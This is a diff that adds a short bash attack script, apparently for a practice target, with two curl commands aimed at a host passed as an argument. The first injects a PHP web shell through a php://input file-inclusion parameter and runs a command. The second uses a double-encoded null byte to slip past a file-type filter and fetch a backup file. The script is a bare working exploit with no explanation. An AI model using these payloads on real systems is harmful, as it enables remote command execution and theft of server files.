@@ -1,0 +1,7 @@
+#!/bin/bash
+
+#server side php injection
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://$1/index.php?language=php://input&cmd=id"
+
+#Poison Null Type HTTP injection
+curl -iX GET http://$1/ftp/package.json.bak%2500.md
